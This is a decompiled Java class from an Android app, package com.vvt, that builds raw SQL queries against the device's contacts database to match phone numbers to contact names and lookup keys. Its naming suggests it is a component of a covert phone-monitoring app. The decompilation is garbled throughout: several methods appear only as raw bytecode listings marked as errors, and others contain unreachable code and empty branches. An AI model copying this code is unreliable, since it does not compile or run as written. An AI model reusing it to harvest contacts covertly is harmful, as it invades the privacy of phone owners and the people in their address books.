package com.vvt.h;

import android.database.sqlite.SQLiteDatabase;
import android.os.Build.VERSION;
import android.telephony.PhoneNumberUtils;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;

public class h
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static String a()
  {
    String str1 = "SELECT contacts._id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts._id = ?)";
    String str2 = "SELECT contacts._id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts._id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts._id = ?)";
    int i = c();
    int j = 7;
    if (i <= j) {}
    for (;;)
    {
      return str2;
      str2 = str1;
    }
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: iconst_4
    //   3: anewarray 4	java/lang/Object
    //   6: astore_3
    //   7: aload_3
    //   8: iconst_0
    //   9: ldc 31
    //   11: aastore
    //   12: aload_3
    //   13: iconst_1
    //   14: ldc 34
    //   16: aastore
    //   17: ldc 37
    //   19: astore 4
    //   21: aload_3
    //   22: iconst_2
    //   23: aload 4
    //   25: aastore
    //   26: iconst_3
    //   27: istore 5
    //   29: aload_3
    //   30: iload 5
    //   32: aload_1
    //   33: aastore
    //   34: ldc 28
    //   36: aload_3
    //   37: invokestatic 44	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   40: astore 6
    //   42: iconst_0
    //   43: istore 7
    //   45: aconst_null
    //   46: astore_3
    //   47: aload_0
    //   48: aload 6
    //   50: aconst_null
    //   51: invokevirtual 50	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   54: astore 6
    //   56: aload 6
    //   58: ifnull +17 -> 75
    //   61: aload 6
    //   63: invokeinterface 55 1 0
    //   68: istore 7
    //   70: iload 7
    //   72: ifne +43 -> 115
    //   75: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   78: istore 7
    //   80: iload 7
    //   82: ifeq +3 -> 85
    //   85: aload 6
    //   87: ifnull +10 -> 97
    //   90: aload 6
    //   92: invokeinterface 59 1 0
    //   97: aload_0
    //   98: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   101: aload 6
    //   103: ifnull +10 -> 113
    //   106: aload 6
    //   108: invokeinterface 59 1 0
    //   113: aload_2
    //   114: areturn
    //   115: aload 6
    //   117: invokeinterface 64 1 0
    //   122: istore 7
    //   124: iload 7
    //   126: ifeq +26 -> 152
    //   129: ldc 31
    //   131: astore_3
    //   132: aload 6
    //   134: aload_3
    //   135: invokeinterface 68 2 0
    //   140: istore 7
    //   142: aload 6
    //   144: iload 7
    //   146: invokeinterface 72 2 0
    //   151: astore_2
    //   152: aload 6
    //   154: invokeinterface 59 1 0
    //   159: aload 6
    //   161: ifnull -48 -> 113
    //   164: goto -58 -> 106
    //   167: astore 6
    //   169: aconst_null
    //   170: astore 6
    //   172: getstatic 17	com/vvt/AppEngine1/AppEngine1:removeFromPath	Z
    //   175: istore 7
    //   177: iload 7
    //   179: ifeq +3 -> 182
    //   182: aload 6
    //   184: ifnull -71 -> 113
    //   187: goto -81 -> 106
    //   190: astore 8
    //   192: aconst_null
    //   193: astore 6
    //   195: aload 8
    //   197: astore_2
    //   198: aload 6
    //   200: ifnull +10 -> 210
    //   203: aload 6
    //   205: invokeinterface 59 1 0
    //   210: aload_2
    //   211: athrow
    //   212: astore_2
    //   213: goto -15 -> 198
    //   216: astore_3
    //   217: goto -45 -> 172
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	220	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	220	1	paramString	String
    //   1	210	2	localObject1	Object
    //   212	1	2	localObject2	Object
    //   6	129	3	localObject3	Object
    //   216	1	3	localSQLiteException1	android.database.sqlite.SQLiteException
    //   19	5	4	str	String
    //   27	4	5	i	int
    //   40	120	6	localObject4	Object
    //   167	1	6	localSQLiteException2	android.database.sqlite.SQLiteException
    //   170	34	6	localObject5	Object
    //   43	28	7	j	int
    //   78	47	7	bool1	boolean
    //   140	5	7	k	int
    //   175	3	7	bool2	boolean
    //   190	6	8	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   50	54	167	android/database/sqlite/SQLiteException
    //   50	54	190	finally
    //   61	68	212	finally
    //   75	78	212	finally
    //   90	97	212	finally
    //   97	101	212	finally
    //   115	122	212	finally
    //   134	140	212	finally
    //   144	151	212	finally
    //   152	159	212	finally
    //   172	175	212	finally
    //   61	68	216	android/database/sqlite/SQLiteException
    //   75	78	216	android/database/sqlite/SQLiteException
    //   90	97	216	android/database/sqlite/SQLiteException
    //   97	101	216	android/database/sqlite/SQLiteException
    //   115	122	216	android/database/sqlite/SQLiteException
    //   134	140	216	android/database/sqlite/SQLiteException
    //   144	151	216	android/database/sqlite/SQLiteException
    //   152	159	216	android/database/sqlite/SQLiteException
  }
  
  /* Error */
  public static String a(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: iconst_0
    //   13: istore_3
    //   14: aconst_null
    //   15: astore 4
    //   17: iconst_0
    //   18: invokestatic 79	com/vvt/AppEngine1/e:a	(Z)Landroid/database/sqlite/SQLiteDatabase;
    //   21: astore 5
    //   23: aload 5
    //   25: ifnonnull +19 -> 44
    //   28: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   31: istore_3
    //   32: iload_3
    //   33: ifeq +3 -> 36
    //   36: iconst_0
    //   37: istore_3
    //   38: aconst_null
    //   39: astore 4
    //   41: aload 4
    //   43: areturn
    //   44: aload 5
    //   46: invokevirtual 83	android/database/sqlite/SQLiteDatabase:getPath	()Ljava/lang/String;
    //   49: astore 4
    //   51: aload 4
    //   53: ifnull +13 -> 66
    //   56: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   59: istore 6
    //   61: iload 6
    //   63: ifeq +3 -> 66
    //   66: ldc 85
    //   68: astore 7
    //   70: aload 4
    //   72: aload 7
    //   74: invokevirtual 89	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   77: istore_3
    //   78: iload_3
    //   79: ifeq +97 -> 176
    //   82: aload_0
    //   83: invokestatic 93	com/vvt/AppEngine1/AppEngine1:d	(Ljava/lang/String;)Ljava/lang/String;
    //   86: astore 4
    //   88: iconst_0
    //   89: istore 6
    //   91: aconst_null
    //   92: astore 7
    //   94: aload 5
    //   96: aload 4
    //   98: aconst_null
    //   99: invokevirtual 50	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   102: astore 7
    //   104: aload 7
    //   106: ifnull +15 -> 121
    //   109: aload 7
    //   111: invokeinterface 55 1 0
    //   116: istore_3
    //   117: iload_3
    //   118: ifne +67 -> 185
    //   121: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   124: istore_3
    //   125: iload_3
    //   126: ifeq +3 -> 129
    //   129: aload 7
    //   131: ifnull +10 -> 141
    //   134: aload 7
    //   136: invokeinterface 59 1 0
    //   141: aload 5
    //   143: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   146: aload 7
    //   148: ifnull +10 -> 158
    //   151: aload 7
    //   153: invokeinterface 59 1 0
    //   158: aload 5
    //   160: ifnull +8 -> 168
    //   163: aload 5
    //   165: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   168: iconst_0
    //   169: istore_3
    //   170: aconst_null
    //   171: astore 4
    //   173: goto -132 -> 41
    //   176: aload_0
    //   177: invokestatic 95	com/vvt/AppEngine1/AppEngine1:e	(Ljava/lang/String;)Ljava/lang/String;
    //   180: astore 4
    //   182: goto -94 -> 88
    //   185: aload 7
    //   187: invokeinterface 64 1 0
    //   192: istore_3
    //   193: iload_3
    //   194: ifeq +181 -> 375
    //   197: ldc 97
    //   199: astore 4
    //   201: aload 7
    //   203: aload 4
    //   205: invokeinterface 68 2 0
    //   210: istore_3
    //   211: aload 7
    //   213: iload_3
    //   214: invokeinterface 72 2 0
    //   219: astore 4
    //   221: aload 7
    //   223: invokeinterface 59 1 0
    //   228: aload 5
    //   230: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   233: aload 7
    //   235: ifnull +10 -> 245
    //   238: aload 7
    //   240: invokeinterface 59 1 0
    //   245: aload 5
    //   247: ifnull +8 -> 255
    //   250: aload 5
    //   252: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   255: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   258: istore_1
    //   259: iload_1
    //   260: ifeq +3 -> 263
    //   263: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   266: istore_1
    //   267: iload_1
    //   268: ifeq -227 -> 41
    //   271: goto -230 -> 41
    //   274: astore 4
    //   276: iconst_0
    //   277: istore_3
    //   278: aconst_null
    //   279: astore 4
    //   281: getstatic 17	com/vvt/AppEngine1/AppEngine1:removeFromPath	Z
    //   284: istore 6
    //   286: iload 6
    //   288: ifeq +3 -> 291
    //   291: aload_2
    //   292: ifnull +9 -> 301
    //   295: aload_2
    //   296: invokeinterface 59 1 0
    //   301: aload 5
    //   303: ifnull -48 -> 255
    //   306: goto -56 -> 250
    //   309: astore 4
    //   311: iconst_0
    //   312: istore 6
    //   314: aconst_null
    //   315: astore 7
    //   317: aload 7
    //   319: ifnull +10 -> 329
    //   322: aload 7
    //   324: invokeinterface 59 1 0
    //   329: aload 5
    //   331: ifnull +8 -> 339
    //   334: aload 5
    //   336: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   339: aload 4
    //   341: athrow
    //   342: astore 4
    //   344: goto -27 -> 317
    //   347: astore 4
    //   349: aload_2
    //   350: astore 7
    //   352: goto -35 -> 317
    //   355: astore 4
    //   357: iconst_0
    //   358: istore_3
    //   359: aconst_null
    //   360: astore 4
    //   362: aload 7
    //   364: astore_2
    //   365: goto -84 -> 281
    //   368: astore_2
    //   369: aload 7
    //   371: astore_2
    //   372: goto -91 -> 281
    //   375: iconst_0
    //   376: istore_3
    //   377: aconst_null
    //   378: astore 4
    //   380: goto -159 -> 221
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	383	0	paramString	String
    //   1	267	1	bool1	boolean
    //   3	362	2	localObject1	Object
    //   368	1	2	localSQLiteException1	android.database.sqlite.SQLiteException
    //   371	1	2	localObject2	Object
    //   7	72	3	bool2	boolean
    //   116	2	3	i	int
    //   124	70	3	bool3	boolean
    //   210	167	3	j	int
    //   15	205	4	str	String
    //   274	1	4	localSQLiteException2	android.database.sqlite.SQLiteException
    //   279	1	4	localObject3	Object
    //   309	31	4	localObject4	Object
    //   342	1	4	localObject5	Object
    //   347	1	4	localObject6	Object
    //   355	1	4	localSQLiteException3	android.database.sqlite.SQLiteException
    //   360	19	4	localObject7	Object
    //   21	314	5	localSQLiteDatabase	SQLiteDatabase
    //   59	254	6	bool4	boolean
    //   68	302	7	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   98	102	274	android/database/sqlite/SQLiteException
    //   98	102	309	finally
    //   109	116	342	finally
    //   121	124	342	finally
    //   134	141	342	finally
    //   141	146	342	finally
    //   185	192	342	finally
    //   203	210	342	finally
    //   213	219	342	finally
    //   221	228	342	finally
    //   228	233	342	finally
    //   281	284	347	finally
    //   109	116	355	android/database/sqlite/SQLiteException
    //   121	124	355	android/database/sqlite/SQLiteException
    //   134	141	355	android/database/sqlite/SQLiteException
    //   141	146	355	android/database/sqlite/SQLiteException
    //   185	192	355	android/database/sqlite/SQLiteException
    //   203	210	355	android/database/sqlite/SQLiteException
    //   213	219	355	android/database/sqlite/SQLiteException
    //   221	228	368	android/database/sqlite/SQLiteException
    //   228	233	368	android/database/sqlite/SQLiteException
  }
  
  /* Error */
  private static String a(String paramString, boolean paramBoolean, SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: iload_1
    //   6: ifeq +278 -> 284
    //   9: aload_0
    //   10: invokestatic 100	com/vvt/AppEngine1/AppEngine1:f	(Ljava/lang/String;)Ljava/lang/String;
    //   13: astore 5
    //   15: new 102	java/util/HashSet
    //   18: astore 6
    //   20: aload 6
    //   22: invokespecial 105	java/util/HashSet:<init>	()V
    //   25: iconst_0
    //   26: istore 7
    //   28: aconst_null
    //   29: astore 8
    //   31: aload_2
    //   32: aload 5
    //   34: aconst_null
    //   35: invokevirtual 50	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   38: astore 5
    //   40: aload 5
    //   42: ifnull +258 -> 300
    //   45: aload 5
    //   47: invokeinterface 64 1 0
    //   52: istore_3
    //   53: iload_3
    //   54: ifeq +239 -> 293
    //   57: ldc 97
    //   59: astore 4
    //   61: aload 5
    //   63: aload 4
    //   65: invokeinterface 68 2 0
    //   70: istore_3
    //   71: aload 5
    //   73: iload_3
    //   74: invokeinterface 72 2 0
    //   79: astore 4
    //   81: aload 4
    //   83: ifnull -38 -> 45
    //   86: aload 4
    //   88: invokevirtual 108	java/lang/String:trim	()Ljava/lang/String;
    //   91: astore 8
    //   93: aload 8
    //   95: invokevirtual 111	java/lang/String:length	()I
    //   98: istore 7
    //   100: iload 7
    //   102: ifeq -57 -> 45
    //   105: aload 4
    //   107: invokevirtual 108	java/lang/String:trim	()Ljava/lang/String;
    //   110: astore 4
    //   112: ldc 113
    //   114: astore 8
    //   116: aload 4
    //   118: aload 8
    //   120: invokevirtual 117	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   123: istore 7
    //   125: iload 7
    //   127: ifne -82 -> 45
    //   130: ldc 119
    //   132: astore 8
    //   134: aload 4
    //   136: aload 8
    //   138: invokevirtual 117	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   141: istore 7
    //   143: iload 7
    //   145: ifne -100 -> 45
    //   148: ldc 121
    //   150: astore 8
    //   152: aload 4
    //   154: aload 8
    //   156: invokevirtual 89	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   159: istore 7
    //   161: iload 7
    //   163: ifne -118 -> 45
    //   166: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   169: istore 7
    //   171: iload 7
    //   173: ifeq +3 -> 176
    //   176: aload 6
    //   178: aload 4
    //   180: invokevirtual 125	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   183: pop
    //   184: goto -139 -> 45
    //   187: astore 4
    //   189: getstatic 17	com/vvt/AppEngine1/AppEngine1:removeFromPath	Z
    //   192: istore_3
    //   193: iload_3
    //   194: ifeq +3 -> 197
    //   197: aload 5
    //   199: ifnull +10 -> 209
    //   202: aload 5
    //   204: invokeinterface 59 1 0
    //   209: new 127	java/lang/StringBuilder
    //   212: astore 4
    //   214: aload 4
    //   216: invokespecial 128	java/lang/StringBuilder:<init>	()V
    //   219: aload 6
    //   221: invokevirtual 132	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   224: astore 6
    //   226: aload 6
    //   228: invokeinterface 137 1 0
    //   233: istore 9
    //   235: iload 9
    //   237: ifeq +111 -> 348
    //   240: aload 4
    //   242: invokevirtual 138	java/lang/StringBuilder:length	()I
    //   245: istore 9
    //   247: iload 9
    //   249: ifle +76 -> 325
    //   252: aload 4
    //   254: ldc -116
    //   256: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   259: astore 8
    //   261: aload 6
    //   263: invokeinterface 148 1 0
    //   268: checkcast 40	java/lang/String
    //   271: astore 5
    //   273: aload 8
    //   275: aload 5
    //   277: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   280: pop
    //   281: goto -55 -> 226
    //   284: aload_0
    //   285: invokestatic 151	com/vvt/AppEngine1/AppEngine1:FxFileObserverWorker	(Ljava/lang/String;)Ljava/lang/String;
    //   288: astore 5
    //   290: goto -275 -> 15
    //   293: aload 5
    //   295: invokeinterface 59 1 0
    //   300: aload 5
    //   302: ifnull -93 -> 209
    //   305: goto -103 -> 202
    //   308: astore 5
    //   310: aload 4
    //   312: ifnull +10 -> 322
    //   315: aload 4
    //   317: invokeinterface 59 1 0
    //   322: aload 5
    //   324: athrow
    //   325: aload 6
    //   327: invokeinterface 148 1 0
    //   332: checkcast 40	java/lang/String
    //   335: astore 5
    //   337: aload 4
    //   339: aload 5
    //   341: invokevirtual 144	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   344: pop
    //   345: goto -119 -> 226
    //   348: aload 4
    //   350: invokevirtual 138	java/lang/StringBuilder:length	()I
    //   353: istore 9
    //   355: iload 9
    //   357: ifne +5 -> 362
    //   360: aload_0
    //   361: areturn
    //   362: aload 4
    //   364: invokevirtual 154	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   367: astore_0
    //   368: goto -8 -> 360
    //   371: astore 10
    //   373: aload 5
    //   375: astore 4
    //   377: aload 10
    //   379: astore 5
    //   381: goto -71 -> 310
    //   384: astore 5
    //   386: iconst_0
    //   387: istore 9
    //   389: aconst_null
    //   390: astore 5
    //   392: goto -203 -> 189
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	395	0	paramString	String
    //   0	395	1	paramBoolean	boolean
    //   0	395	2	paramSQLiteDatabase	SQLiteDatabase
    //   1	53	3	bool1	boolean
    //   70	4	3	i	int
    //   192	2	3	bool2	boolean
    //   3	176	4	str	String
    //   187	1	4	localSQLiteException1	android.database.sqlite.SQLiteException
    //   212	164	4	localObject1	Object
    //   13	288	5	localObject2	Object
    //   308	15	5	localObject3	Object
    //   335	45	5	localObject4	Object
    //   384	1	5	localSQLiteException2	android.database.sqlite.SQLiteException
    //   390	1	5	localObject5	Object
    //   18	308	6	localObject6	Object
    //   26	75	7	j	int
    //   123	49	7	bool3	boolean
    //   29	245	8	localObject7	Object
    //   233	3	9	bool4	boolean
    //   245	143	9	k	int
    //   371	7	10	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   45	52	187	android/database/sqlite/SQLiteException
    //   63	70	187	android/database/sqlite/SQLiteException
    //   73	79	187	android/database/sqlite/SQLiteException
    //   86	91	187	android/database/sqlite/SQLiteException
    //   93	98	187	android/database/sqlite/SQLiteException
    //   105	110	187	android/database/sqlite/SQLiteException
    //   118	123	187	android/database/sqlite/SQLiteException
    //   136	141	187	android/database/sqlite/SQLiteException
    //   154	159	187	android/database/sqlite/SQLiteException
    //   166	169	187	android/database/sqlite/SQLiteException
    //   178	184	187	android/database/sqlite/SQLiteException
    //   293	300	187	android/database/sqlite/SQLiteException
    //   34	38	308	finally
    //   45	52	371	finally
    //   63	70	371	finally
    //   73	79	371	finally
    //   86	91	371	finally
    //   93	98	371	finally
    //   105	110	371	finally
    //   118	123	371	finally
    //   136	141	371	finally
    //   154	159	371	finally
    //   166	169	371	finally
    //   178	184	371	finally
    //   189	192	371	finally
    //   293	300	371	finally
    //   34	38	384	android/database/sqlite/SQLiteException
  }
  
  public static String a(String[] paramArrayOfString)
  {
    int i = 0;
    String str1 = null;
    boolean bool2 = false;
    Object localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    bool3 = a;
    if ((!bool3) || (paramArrayOfString != null))
    {
      int j = paramArrayOfString.length;
      int k = 1;
      if (j >= k) {}
    }
    else
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      return str1;
      Object localObject2 = e.a(false);
      if (localObject2 == null)
      {
        bool2 = a;
        if (!bool2) {}
      }
      else
      {
        str1 = ((SQLiteDatabase)localObject2).getPath();
        if (str1 != null)
        {
          bool4 = a;
          if (!bool4) {}
        }
        String str2 = "contacts.db";
        boolean bool4 = str1.contains(str2);
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        int n = paramArrayOfString.length;
        i = 0;
        str1 = null;
        while (i < n)
        {
          localObject1 = a(paramArrayOfString[i], bool4, (SQLiteDatabase)localObject2);
          localArrayList.add(localObject1);
          i += 1;
        }
        ((SQLiteDatabase)localObject2).close();
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject2 = localArrayList.iterator();
        for (;;)
        {
          boolean bool1 = ((Iterator)localObject2).hasNext();
          if (!bool1) {
            break;
          }
          str1 = (String)((Iterator)localObject2).next();
          if (str1 != null)
          {
            str2 = "null";
            bool4 = str1.contains(str2);
            if (!bool4)
            {
              int m = ((StringBuilder)localObject1).length();
              if (m > 0)
              {
                str2 = "; ";
                ((StringBuilder)localObject1).append(str2);
              }
              ((StringBuilder)localObject1).append(str1);
            }
          }
        }
        str1 = ((StringBuilder)localObject1).toString();
        bool2 = a;
        if (bool2) {}
        bool2 = a;
        if (!bool2) {}
      }
    }
  }
  
  public static HashMap a(HashSet paramHashSet)
  {
    boolean bool1 = a;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    bool1 = false;
    Object localObject = null;
    SQLiteDatabase localSQLiteDatabase = e.a(false);
    if (localSQLiteDatabase != null)
    {
      localObject = localSQLiteDatabase.getPath();
      if (localObject != null) {}
    }
    else
    {
      bool1 = a;
      if (!bool1) {}
    }
    for (localObject = localHashMap;; localObject = localHashMap)
    {
      return (HashMap)localObject;
      localObject = localSQLiteDatabase.getPath();
      boolean bool2 = a;
      if (bool2) {}
      String str1 = "contacts.db";
      bool2 = ((String)localObject).contains(str1);
      Iterator localIterator = paramHashSet.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = (String)localIterator.next();
        String str2 = a((String)localObject, bool2, localSQLiteDatabase);
        localHashMap.put(localObject, str2);
      }
      localSQLiteDatabase.close();
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public static String b()
  {
    String str1 = "SELECT contacts._id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (data.data2 = ?)";
    String str2 = "SELECT contacts._id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts._id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (data.data2 = ?)";
    int i = c();
    int j = 7;
    if (i <= j) {}
    for (;;)
    {
      return str2;
      str2 = str1;
    }
  }
  
  /* Error */
  public static String b(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: iconst_0
    //   13: invokestatic 79	com/vvt/AppEngine1/e:a	(Z)Landroid/database/sqlite/SQLiteDatabase;
    //   16: astore 4
    //   18: aload 4
    //   20: ifnonnull +13 -> 33
    //   23: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   26: istore_3
    //   27: iload_3
    //   28: ifeq +3 -> 31
    //   31: aload_2
    //   32: areturn
    //   33: aload 4
    //   35: invokevirtual 83	android/database/sqlite/SQLiteDatabase:getPath	()Ljava/lang/String;
    //   38: astore 5
    //   40: aload 5
    //   42: ifnull +11 -> 53
    //   45: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   48: istore_3
    //   49: iload_3
    //   50: ifeq +3 -> 53
    //   53: aload 4
    //   55: aload_0
    //   56: invokestatic 178	com/vvt/AppEngine1/AppEngine1:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   59: astore 5
    //   61: aload 5
    //   63: ifnull +239 -> 302
    //   66: bipush 6
    //   68: istore 6
    //   70: iload 6
    //   72: anewarray 4	java/lang/Object
    //   75: astore 7
    //   77: aload 7
    //   79: iconst_0
    //   80: ldc 37
    //   82: aastore
    //   83: aload 7
    //   85: iconst_1
    //   86: ldc 34
    //   88: aastore
    //   89: ldc 31
    //   91: astore_1
    //   92: aload 7
    //   94: iconst_2
    //   95: aload_1
    //   96: aastore
    //   97: iconst_3
    //   98: istore 8
    //   100: aload 7
    //   102: iload 8
    //   104: aload 5
    //   106: aastore
    //   107: aload 7
    //   109: iconst_4
    //   110: ldc -73
    //   112: aastore
    //   113: iconst_5
    //   114: istore_3
    //   115: ldc -70
    //   117: astore 9
    //   119: aload 7
    //   121: iload_3
    //   122: aload 9
    //   124: aastore
    //   125: ldc -76
    //   127: aload 7
    //   129: invokestatic 44	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   132: astore 5
    //   134: iconst_0
    //   135: istore 10
    //   137: aconst_null
    //   138: astore 11
    //   140: aload 4
    //   142: aload 5
    //   144: aconst_null
    //   145: invokevirtual 50	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   148: astore 5
    //   150: aload 5
    //   152: ifnull +17 -> 169
    //   155: aload 5
    //   157: invokeinterface 55 1 0
    //   162: istore 10
    //   164: iload 10
    //   166: ifne +55 -> 221
    //   169: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   172: istore 10
    //   174: iload 10
    //   176: ifeq +3 -> 179
    //   179: aload 5
    //   181: ifnull +10 -> 191
    //   184: aload 5
    //   186: invokeinterface 59 1 0
    //   191: aload 4
    //   193: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   196: aload 5
    //   198: ifnull +10 -> 208
    //   201: aload 5
    //   203: invokeinterface 59 1 0
    //   208: aload 4
    //   210: ifnull -179 -> 31
    //   213: aload 4
    //   215: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   218: goto -187 -> 31
    //   221: aload 5
    //   223: invokeinterface 64 1 0
    //   228: istore 10
    //   230: iload 10
    //   232: ifeq +28 -> 260
    //   235: ldc 37
    //   237: astore 11
    //   239: aload 5
    //   241: aload 11
    //   243: invokeinterface 68 2 0
    //   248: istore 10
    //   250: aload 5
    //   252: iload 10
    //   254: invokeinterface 72 2 0
    //   259: astore_2
    //   260: aload 5
    //   262: invokeinterface 59 1 0
    //   267: aload 4
    //   269: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   272: aload 5
    //   274: ifnull +10 -> 284
    //   277: aload 5
    //   279: invokeinterface 59 1 0
    //   284: aload 4
    //   286: ifnull +8 -> 294
    //   289: aload 4
    //   291: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   294: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   297: istore_3
    //   298: iload_3
    //   299: ifeq +3 -> 302
    //   302: getstatic 12	com/vvt/AppEngine1/AppEngine1:a	Z
    //   305: istore_3
    //   306: iload_3
    //   307: ifeq -276 -> 31
    //   310: goto -279 -> 31
    //   313: astore 5
    //   315: iconst_0
    //   316: istore_3
    //   317: aconst_null
    //   318: astore 5
    //   320: getstatic 17	com/vvt/AppEngine1/AppEngine1:removeFromPath	Z
    //   323: istore 10
    //   325: iload 10
    //   327: ifeq +3 -> 330
    //   330: aload 5
    //   332: ifnull +10 -> 342
    //   335: aload 5
    //   337: invokeinterface 59 1 0
    //   342: aload 4
    //   344: ifnull -50 -> 294
    //   347: goto -58 -> 289
    //   350: astore 12
    //   352: iconst_0
    //   353: istore_3
    //   354: aconst_null
    //   355: astore 5
    //   357: aload 12
    //   359: astore_2
    //   360: aload 5
    //   362: ifnull +10 -> 372
    //   365: aload 5
    //   367: invokeinterface 59 1 0
    //   372: aload 4
    //   374: ifnull +8 -> 382
    //   377: aload 4
    //   379: invokevirtual 60	android/database/sqlite/SQLiteDatabase:close	()V
    //   382: aload_2
    //   383: athrow
    //   384: astore_2
    //   385: goto -25 -> 360
    //   388: astore 11
    //   390: goto -70 -> 320
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	393	0	paramString	String
    //   1	95	1	str1	String
    //   3	380	2	localObject1	Object
    //   384	1	2	localObject2	Object
    //   7	43	3	bool1	boolean
    //   114	8	3	i	int
    //   297	57	3	bool2	boolean
    //   16	362	4	localSQLiteDatabase	SQLiteDatabase
    //   38	240	5	localObject3	Object
    //   313	1	5	localSQLiteException1	android.database.sqlite.SQLiteException
    //   318	48	5	localObject4	Object
    //   68	3	6	j	int
    //   75	53	7	arrayOfObject	Object[]
    //   98	5	8	k	int
    //   117	6	9	str2	String
    //   135	30	10	m	int
    //   172	59	10	bool3	boolean
    //   248	5	10	n	int
    //   323	3	10	bool4	boolean
    //   138	104	11	str3	String
    //   388	1	11	localSQLiteException2	android.database.sqlite.SQLiteException
    //   350	8	12	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   144	148	313	android/database/sqlite/SQLiteException
    //   144	148	350	finally
    //   155	162	384	finally
    //   169	172	384	finally
    //   184	191	384	finally
    //   191	196	384	finally
    //   221	228	384	finally
    //   241	248	384	finally
